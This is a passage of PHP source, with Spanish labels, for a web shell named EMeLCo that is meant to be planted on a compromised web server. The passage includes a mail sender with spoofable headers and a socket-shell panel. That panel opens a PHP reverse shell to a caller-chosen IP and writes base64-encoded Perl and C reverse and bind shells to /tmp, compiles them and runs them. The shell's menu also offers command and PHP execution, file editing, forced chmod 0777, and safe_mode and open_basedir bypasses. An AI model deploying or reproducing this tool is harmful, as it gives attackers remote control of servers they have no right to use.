            //Ponemos las cabeceras opcionales
            if(isset($_POST['from']) and ($_POST['from']!='')){ $cabeceras.= 'From: '.$_POST['from']."\r\n";}
            if(isset($_POST['cc']) and ($_POST['cc']!='')){ $cabeceras.= 'Cc: '.$_POST['cc']."\r\n";}
            if(isset($_POST['bcc']) and ($_POST['bcc']!='')){ $cabeceras.= 'Bcc: '.$_POST['bcc']."\r\n";}
            if(isset($_POST['reply-to']) and ($_POST['reply-to']!='')){ $cabeceras.= 'Reply-To: '.$_POST['reply-to']."\r\n";}
            if(isset($_POST['message-id']) and ($_POST['message-id']!='')){ $cabeceras.= 'Message-ID: '.$_POST['message-id']."\r\n";}
            if(isset($_POST['html']) and ($_POST['html'])){ $cabeceras.= 'MIME-Version: 1.0' . "\r\n".'Content-type: text/html; charset=iso-8859-1' . "\r\n";}
            
            $_POST['message'] = wordwrap($_POST['message'],70);         //maximo 70 caracteres por linea
            
            if ($cabeceras){
                $salida = mail($_POST['to'],$_POST['subject'],$_POST['message'],$cabeceras);
            }else{
                $salida = mail($_POST['to'],$_POST['subject'],$_POST['message']);
            }
            
            if ($salida){
                echo '<div class="s center">Email enviado</div><br><br>';
            }else{
                echo '<div class="n center">Error enviando el email</div><br><br>';
            }
        }
        
        //Mostramos el formulario
        if(isset($_POST['html']) and ($_POST['html'])){ $checked = ' checked'; }
        echo '<form action="'.$rfiurl.'w=mail" method="post" style="width:100%;text-align:center;"><table>
        <tr><td>Para:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="to" value="'.htmlentities($_POST['to'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
        <tr><td>De:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="from" value="'.htmlentities($_POST['from'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
        <tr><td>Cc:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="cc" value="'.htmlentities($_POST['cc'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
        <tr><td>Bcc:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="bcc" value="'.htmlentities($_POST['bcc'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
        <tr><td>Responder a:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="reply-to" value="'.htmlentities($_POST['reply-to'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
        <tr><td>ID:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="message-id" value="'.htmlentities($_POST['message-id'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
        <tr><td>Asunto:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="subject" value="'.htmlentities($_POST['subject'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
        <tr><td>HTML:</td><td style="width:90%;"><input type="checkbox" style="width:100%; align:left;" name="html"'.$checked.'><br></td></tr>
        <tr><td>Mensaje:</td style="width:90%;"><td><textarea style="width:100%; height:200px; align:left;" name="message">'.$_POST['message'].'</textarea><br></td></tr>
        <tr><td colspan="2" style="width:90%;"><input type="submit" style="width:17%; float:right;" value="Enviar"></td></tr>
        </table></form>';
    break;

    /* Para redirigir sin referer */
    case 'redirect':
        echo '<meta http-equiv="refresh" content="0; URL=http://'.htmlentities($_GET['url'],ENT_QUOTES,'UTF-8').'">';
    break;
    
    /* Conexion inversa / escuchar */
    case 'socketshell':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';

        echo '
        <table>
            <form action="'.$rfiurl.'w=socketshell" method="post">
                <tr>
                    <td>
                        Conexi&oacute;n inversa: <br>IP <input type="text" name="ip" value="'.($_POST['ip']?$_POST['ip']:$_SERVER['REMOTE_ADDR']).'"><br>
                        Puerto <input type="text" name="puertoinversa" value="'.($_POST['puertoinversa']?$_POST['puertoinversa']:'80').'"><br>
                        <select name="metodoinversa">
                            <option value="php">PHP</option>
                            <option value="perl">Perl</option>
                            <option value="c">C</option>
                        </select><br><br>
                        <input type="submit" name="accion" value="Conectar">
                    </td>
                    <td style="width:3px; padding:0px;"></td>
                    <td>
                        Escuchar: <br>Puerto <input type="text" name="puertoescuchar" value="'.($_POST['puertoescuchar']?$_POST['puertoescuchar']:'8080').'"><br>
                        <select name="metodoescuchar">
                            <option value="perl">Perl</option>
                            <option value="c">C</option>
                        </select><br><br>
                        <input type="submit" name="accion" value="Escuchar">
                    </td>
                </tr>
            </form>
        </table>
        <br>
        ';
        if($_POST['accion']=='Conectar'){
            if($_POST['metodoinversa'] == 'php'){
                if(is_resource($socket = pfsockopen($_POST['ip'],$_POST['puertoinversa']))){
                    $descriptorspec = array($socket,$socket,$socket);
                    $shellproc = proc_open('/bin/sh',$descriptorspec,$pipes);
                    fputs($socket,'WARNING:  The use of this U.S. Government system is restricted to authorized users only.  Unauthorized access, use, or modification of this computer system or of the data contained herein or in transit to/from this system constitutes a violation of Title 18, United States Code, Section 1030 and state criminal and civil laws.  These systems and equipment are subject to monitoring to ensure proper performance of applicable security features or procedures.  Such monitoring may result in the acquisition, recording and analysis of all data being communicated, transmitted, processed or stored in this system by a user.  If monitoring reveals possible evidence of criminal activity, such evidence may be provided to law enforcement personnel. \n\n      ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH'."\n");
                    proc_close($shellproc);
                    fclose($socket);
                    echo '<div class="s">Conectado</div>';
                }else{
                    echo '<div class="n">No se pudo conectar</div>';
                }
            }elseif($_POST['metodoinversa'] == 'perl'){
		escribir_archivo('/tmp/bc.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvciIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3IiKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7'));
		chmod('/tmp/bc.pl',0777);
                $resultado = shell('perl /tmp/bc.pl '.$_POST['ip'].' '.$_POST['puertoinversa'].' 2>&1', false);
                if (($resultado===false) or (substr($resultado,0,5)=='Error')){
                    echo '<div class="n">No se pudo conectar</div>';
                }else{
                    echo '<div class="s">Conectado</div>'; 
                }
                unlink('/tmp/bc.pl');
            }elseif($_POST['metodoinversa'] == 'c'){
		escribir_archivo('/tmp/bc.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQoJcHJpbnRmKCJFcnJvciIsc3Rkb3V0KTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIGR1cDIoZmQsIDApOw0KICAgIGR1cDIoZmQsIDEpOw0KICAgIGR1cDIoZmQsIDIpOw0KICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgIGNsb3NlKGZkKTsNCn0='));
		chmod('/tmp/bc.c',0777);
                echo '<div class="n">'.shell('gcc -o /tmp/bc /tmp/bc.c 2>&1',false).'</div>';
                unlink('/tmp/bc.c');
		chmod('/tmp/bc',0777);
                $resultado = shell('/tmp/bc '.$_POST['ip'].' '.$_POST['puertoinversa'], false);
                if (($resultado === false) or (substr($resultado,0,5) == 'Error') or(file_exists('/tmp/bc')==false)){
                    echo '<div class="n">No se pudo conectar</div>';
                }else{
                    echo '<div class="s">Conectado</div>'; 
                }
                unlink('/tmp/bc');
            }
        }elseif($_POST['accion']=='Escuchar'){
            if($_POST['metodoescuchar'] == 'perl'){
		escribir_archivo('/tmp/bp.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJFcnJvciI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiRXJyb3IiOw0KbGlzdGVuKFMsMykgfHwgZGllIGRpZSAiRXJyb3IiOw0KYWNjZXB0KENPTk4sUyk7DQpvcGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwiPiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJDYW50IGV4ZWN1dGUgJFNIRUxMXG4iOw0KY2xvc2UgQ09OTjsNCmV4aXQgMDs='));
		chmod('/tmp/bp.pl',0777);
                $resultado = shell('perl /tmp/bp.pl '.$_POST['puertoescuchar'].'  2>&1', false);
                if (($resultado===false) or (substr($resultado,0,5)=='Error')){
                    echo '<div class="n">No se pudo conectar</div>';
                }else{
                    echo '<div class="s">Conectado</div>'; 
                }
            }elseif($_POST['metodoescuchar'] == 'c'){
                escribir_archivo('/tmp/bp.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGludCBzb2NrZmQsIG5ld2ZkLCBpOwogICAgY2hhciBwYXNzWzMwXTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7CiAgICBkYWVtb24oMSwwKTsKICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOwogICAgaWYoIXNvY2tmZCl7CglwcmludGYoIkVycm9yIixzdGRvdXQpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgcmVtb3RlLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzFdKSk7CiAgICByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgICBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOwogICAgbGlzdGVuKHNvY2tmZCwgNSk7CiAgICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7CiAgICBkdXAyKG5ld2ZkLDApOwogICAgZHVwMihuZXdmZCwxKTsKICAgIGR1cDIobmV3ZmQsMik7CiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsKICAgIGNsb3NlKG5ld2ZkKTsKfQ=='));
                chmod('/tmp/bp.c',0777);
                echo '<div class="n">'.shell('gcc -o /tmp/bp /tmp/bp.c 2>&1',false).'</div>';
                unlink('/tmp/bp.c');
		chmod('/tmp/bp',0777);
                $resultado = shell('/tmp/bp '.$_POST['puertoescuchar'], false);
                if (($resultado === false) or (substr($resultado,0,5) == 'Error') or(file_exists('/tmp/bp')==false)){
                    echo '<div class="n">No se pudo conectar</div>';
                }else{
                    echo '<div class="s">Conectado</div>'; 
                }
                unlink('/tmp/bp');
            }
        }

    break; 

    /* Borrar la shell */
    case 'borrame':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div><h2><a href="'.$rfiurl.'w=eliminar&ruta='.urlencode(__FILE__).'">Borrar EMeLCo</a></h2>';       
        
    break;

    /* Menu principal */
    default:
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'w=redirect&url=code.google.com/p/emelco/" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        <a href="'.$rfiurl.'w=directivas">Directivas</a><br>
        <a href="'.$rfiurl.'w=phpinfo">PHPInfo</a><br>
        <a href="'.$rfiurl.'w=info">Mas informaci&oacute;n</a><br>
        <a href="'.$rfiurl.'w=shell">Ejecutar comandos</a><br>
        <a href="'.$rfiurl.'w=php">Ejecutar PHP</a><br>
        <a href="'.$rfiurl.'w=socketshell">Conexi&oacute;n inversa / escuchar</a><br>
        <a href="'.$rfiurl.'w=archivos">Navegador de archivos</a><br>
        <a href="'.$rfiurl.'w=editar">Editor de archivos</a><br>
        <a href="'.$rfiurl.'w=mail">Enviar E-mails</a><br>
        <a href="'.$rfiurl.'w=borrame">Borrar la shell</a><br>
        </div>';
        
        if( ((substr(PHP_VERSION,0,1) == 5) and version_compare(PHP_VERSION, '5.1.6', '<=')) or ((substr(PHP_VERSION,0,1) == 4) and version_compare(PHP_VERSION, '4.4.4', '<=')) ){
            echo '<br><br><div class="ac"><script>
                    function createCookie(name,value,days) {
                        if (days) {
                            var date = new Date();
                            date.setTime(date.getTime()+(days*24*60*60*1000));
                            var expires = "; expires="+date.toGMTString();
                        }
                        else var expires = "";
                        document.cookie = name+"="+value+expires+"; path=/";
                    }
                    function saveIt() {
                        var x =  document.getElementById("openBasedirBypass").checked;
                        createCookie("openBasedirBypass",x,7);
                    }    
                    </script>Bypass open_basedir <a href="'.$rfiurl.'w=redirect&url=securityreason.com/achievement_securityalert/42">PHP 5.1.6, PHP 4.4.4 y anteriores</a>: <input type="checkbox" id="openBasedirBypass" ';
                    if($_COOKIE['openBasedirBypass']=='true'){ echo 'checked="0x62792073657468" '; } 
                    echo 'onclick="saveIt();"/></div>';
        }
}
    
echo'
    </div>
    </div>
    ';
    if($_GET['w']){
        echo'<div class="contenedorgrande" id="contenedorabajo"  style="text-align:center;">
        <a href="'.$rfiurl.'w=directivas">Directivas</a> 
        <a href="'.$rfiurl.'w=phpinfo">PHPInfo</a> 
        <a href="'.$rfiurl.'w=info">Mas informaci&oacute;n</a> 
        <a href="'.$rfiurl.'w=shell">Ejecutar comandos</a> 
        <a href="'.$rfiurl.'w=php">Ejecutar PHP</a> 
        <a href="'.$rfiurl.'w=socketshell">Conexi&oacute;n inversa / escuchar</a> 
        <a href="'.$rfiurl.'w=archivos">Navegador de archivos</a> 
        <a href="'.$rfiurl.'w=editar">Editor de archivos</a> 
        <a href="'.$rfiurl.'w=mail">Enviar E-mails</a> 
        <a href="'.$rfiurl.'w=borrame">Borrar la shell</a>'; 
    }
echo'    </div>
</body>
</html>';

  /*************/
 /* Funciones */
/*************/


/* Recibe datos de directivas y las formatea para el array */
function leerconfig($cual, $desc){
    $resultado[0]='Directiva: <div class="f" title="'.$desc.'">'.$cual.'</div>';
    $temp=ini_get($cual);
    if ($temp!=0){
        $resultado[1]='<div class="s inline">'.htmlentities($temp).'</div>';
    }else{
        if ($temp===''){$temp='0';}
        $resultado[1]='<div class="n inline">'.htmlentities($temp).'</div>';
    }
    unset($temp);
    return $resultado;
}

/* ejecuta comandos */
function shell($cmd, $array = true){
    if (!empty($cmd)){
        if (`echo a`){ $salida[]=(`$cmd`); $salida[]='Modo: `$cmd`';}
        
        elseif (shellpopen('echo a')){$salida[]=shellpopen($cmd); $salida[]='Modo: popen($cmd)';}
        
        elseif (shell_exec('echo a')){$salida[]=shell_exec($cmd); $salida[]='Modo: shell_exec($cmd)';}
        
        elseif (exec('echo a')){$salida[]=exec($cmd); $salida[]='Modo: exec($cmd)';}
        
        elseif (systemreturn('echo a')){$salida[]=systemreturn($cmd); $salida[]='Modo: system($cmd)';}
        
        elseif (passthrureturn('echo a')){$salida[]=passthrureturn($cmd); $salida[]='Modo: passthru($cmd)';}
       
        elseif (shellprocopen('echo a')){$salida[]=shellprocopen($cmd); $salida[]='Modo: proc_open($cmd)';}
       
        elseif (shellpcntl('echo a')){$salida[]=shellpcntl($cmd); $salida[]='Modo: pcntl_exec($cmd)';}
        
        if ($array){
            return $salida;
        }else{
            return $salida[0];
        }
    }else{
        return false;
    }
}
function shellpopen($cmd){
/* fuente: antichat webshell v1.3 */
  if($fp = popen($cmd,'r')){ 
    $result = '';
    while(!feof($fp)){$result.=fread($fp,1024);}
    pclose($fp);
  
    $ret = $result;
    $ret = convert_cyr_string($ret,'d','w');
    return $ret;
  }else{
    return false;
  }
}
function systemreturn($cmd){
    ob_flush();
    ob_start();
        system($cmd);
        $salida = ob_get_clean();
    ob_end_clean();
    return $salida;
}
function passthrureturn($cmd){
    ob_flush();
    ob_start();
        passthru($cmd);
        $salida = ob_get_clean();
    ob_end_clean();
    return $salida;
}
function shellprocopen($cmd){
    $descriptorspec = array(
       0 => array('pipe', 'r'), 
       1 => array('pipe', 'w'), 
       2 => array('pipe', 'w') 
    );
   
    $process = proc_open($cmd, $descriptorspec, $pipes);
    
    if (is_resource($process)) {    
        fclose($pipes[0]);
        $salida = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $return_value = proc_close($process);
        return $salida;
    }else{
        return false;
    }
}
function shellpcntl($cmd){
    if(!function_exists('pcntl_exec')){
        return false;
    }
    $args = explode(' ',$cmd);
    $path = $args[0];
    unset($args[0]);
    if(pcntl_exec($path,$args)===false){
        return false;
    }else{
        return 'El comando fue ejecutado, pero no se pudo recuperar la salida';
    }
}

//muestra los archivos del manejador de archivos
function mostrar_link($ruta,$archivo,$eslink=FALSE){
global $rfiurl;
    if ($ruta){$barra='/';}else{$barra='';}

    //$celdaeditar es la primer columna
    if(is_link($ruta.$barra.$archivo)){         //Cuando son links
        $celdaeditar = '<td style="color:#CD2626;" class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
        $salida = '<img src="'.$rfiurl.'w=img&imagen=enlace" class="ai" alt="Enlace"> <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</a> <img src="'.$rfiurl.'w=img&imagen=flechad" class="ai" alt="enlaza a ">'.mostrar_link("",readlink($ruta.$barra.$archivo),TRUE);
        
    }elseif (is_dir($ruta.$barra.$archivo)){        //Directorios
        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=comprimir&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=comprimir" class="ai" alt="Comprimir"></a> <a href="'.$rfiurl.'w=shell&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=comandos" class="ai" alt="Ejecutar comandos"></a> <a href="'.$rfiurl.'w=php&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=php" class="ai" alt="Ejecutar PHP"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
        $salida = '<img src="'.$rfiurl.'w=img&imagen=carpeta" class="ai" alt="Carpeta"> <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</a>';
        
    }else{      //Archivos
        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=editar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=editar" class="ai" alt="Editar"></a> <a href="'.$rfiurl.'w=descargar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=descargar" class="ai" alt="Descargar"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
        $salida = '<img src="'.$rfiurl.'w=img&imagen=archivo" class="ai" alt="Archivo"> '.htmlentities($archivo,ENT_QUOTES,'UTF-8');
    }
    

    $filesize = format_bytes(filesize($ruta.$barra.$archivo));
    
    if (!$eslink){      //cuando son links no se pone esto
        $perm = permisos($ruta.$barra.$archivo);
        if (is_writable($ruta.$barra.$archivo)){
            $colorpermisos = '#8ABD22';
        }else{
            $colorpermisos = '#CD2626';
        }
        
        $data = posix_getpwuid(fileowner($ruta.$barra.$archivo));
        $usuario = $data['name'];
        $data = posix_getgrgid(filegroup($ruta.$barra.$archivo));
        $usuario.= ':'.$data['name'];
        $salida= '<tr>'.$celdaeditar.'<td style="text-align:left;">'.$salida.'</td><td style="text-align:center;">'.$filesize.'</td><td style="text-align:center;">'.htmlentities($usuario,ENT_QUOTES,'UTF-8') .'</td><td style="text-align:right; color:'.$colorpermisos.'"><a href="'.$rfiurl.'w=chmod&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.$perm.'</a></td><td style="text-align:right;">'.date("d/m/Y H:i",filectime($ruta.$barra.$archivo)).'</td></tr>'."\n";
    }
    return $salida;
}

//devuelve los permisos de un archivo formateados. Fuente: php.net
function permisos($archivo){
    $perms = fileperms($archivo);

    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {        // FIFO pipe
        $info = 'p';
    } else {        // Unknown
        $info = 'u';
    }
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

//formatea el tamaño de los archivos
function format_bytes($b,$p = null) {
    /**
     *
     * @author Martin Sweeny
     * @version 2010.0617
     *
     * returns formatted number of bytes.
     * two parameters: the bytes and the precision (optional).
     * if no precision is set, function will determine clean
     * result automatically.
     *
     **/
    $units = array('B','kB','MB','GB','TB','PB','EB','ZB','YB');
    $c=0;
    if(!$p && $p !== 0) {
        foreach($units as $k => $u) {
            if(($b / pow(1024,$k)) >= 1) {
                $r['bytes'] = $b / pow(1024,$k);
                $r['units'] = $u;
                $c++;
            }
        }
        return number_format($r['bytes'],2) . ' ' . $r['units'];
    } else {
        return number_format($b / pow(1024,$p)) . ' ' . $units[$p];
    }
}

//devuelve el contenido de un archivo
function leer_archivo($ruta){
    if ((!$ruta) or is_dir($ruta)){return FALSE;}
    if (!is_readable($ruta)){
        $permisosviejos = substr(sprintf('%o', fileperms($ruta)), -4);
        chmod($ruta,0777);
    }else{
        $permisosviejos = FALSE;
    }
        
    if(($salida = leer_archivo_fopen($ruta))!==false){
        
    }elseif(($salida = leer_archivo_readfile($ruta))!==false){
        
    }elseif(($salida = leer_archivo_file($ruta))!==false){ 
        
    }elseif(function_exists('file_get_contents') and (($salida = file_get_contents($ruta))!==false)){
        
    }elseif((is_readable($ruta) and ($salida = shell('cat "'.addslashes($ruta).'"',false)))!==false){
    
    }elseif(($salida = leer_archivo_copy_safe_mode_bypass($ruta))!==false){
    
    }else{ $salida = FALSE; }
    
    if ($permisosviejos !== FALSE){
        chmod($ruta,$permisosviejos);
    }
    return $salida;
}
function leer_archivo_fopen($ruta){
    if(!$handle = fopen($ruta, 'r')){
        return FALSE;
    }
    while (!feof($handle)) {
      $contents .= fread($handle, 8192);
    }
    fclose($handle);
    return $contents;
}
function leer_archivo_readfile($ruta){
    ob_flush();
    ob_start();
        $error = readfile($ruta);
        $salida = ob_get_clean();
    ob_end_clean();
    if ($error!==false){return $salida;} else {return false;}
}
function leer_archivo_file($ruta){
    $salida = file($ruta);
    if ($salida === FALSE) {
        return FALSE;
    }else{
        implode('', $salida);
        return $salida;
    }
}
function leer_archivo_copy_safe_mode_bypass($ruta){
    //http://securityreason.com/achievement_securityalert/37
    static $recursivo;
    if( $recursivo == true ) {
        return false;
    }else{
        $recursivo = true;
        if ($temporal = tempnam(directorio_escribible())) {
            copy('compress.zlib://'.$ruta, $temporal);
            $archivo = leerarchivo($temporal);
            unlink($temporal);
        }
        $recursivo = false;
    }
}

//escribe en un archivo
function escribir_archivo($ruta,$contenido) {
    if (!$ruta){return FALSE;}
    if (!is_readable($ruta)){
        $permisosviejos = substr(sprintf('%o', fileperms($ruta)), -4);
        chmod($ruta,0777);
    }else{
        $permisosviejos = FALSE;
    }
    if(function_exists('file_put_contents') and (($salida = file_put_contents($ruta,$contenido))!==FALSE)){
    }else{ return FALSE; }
    
    if ($permisosviejos !== FALSE){
        chmod($ruta,$permisosviejos);
    }
    return $salida;
}

//devuelve el espacio libre/ocupado en el disco de forma entendible
//rostvertol dot mil at gmail dot com
function decode_size( $bytes )
{
    $types = array( 'B', 'KiB', 'MiB', 'GiB', 'TiB' );
    for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
    return( round( $bytes, 2 ) . ' ' . $types[$i] );
}

//borra un archivo o carpeta
function borrar($carpeta){
    if (is_file($carpeta)){
        return unlink($carpeta) or shell('rm -rf '.escapeshellarg($carpeta), FALSE);
    }else{
        foreach(glob($carpeta.'/*') as $archivos_carpeta){
            borrar($archivos_carpeta);
        }
        return rmdir($carpeta) or shell('rm -rf '.escapeshellarg($carpeta), FALSE);
    }
}

//copiar un archivo o carpeta
function copiar_recursivo($origen,$destino) {
    //mezcla entre http://ar.php.net/manual/es/function.copy.php#91010 y http://aidanlister.com/2004/04/recursively-copying-directories-in-php/
    if (is_file($origen)) {
        return copiar_archivo($origen, $destino);
    }
    //aca sigue solo si es un directorio
    $dir = opendir($origen);
    mkdir($destino);
    while(false !== ( $archivo = readdir($dir)) ) {
        if (( $archivo != '.' ) && ( $archivo != '..' )) {
            $salida = copiar_recursivo($origen . '/' . $archivo, $destino . '/' . $archivo);
        }
    }
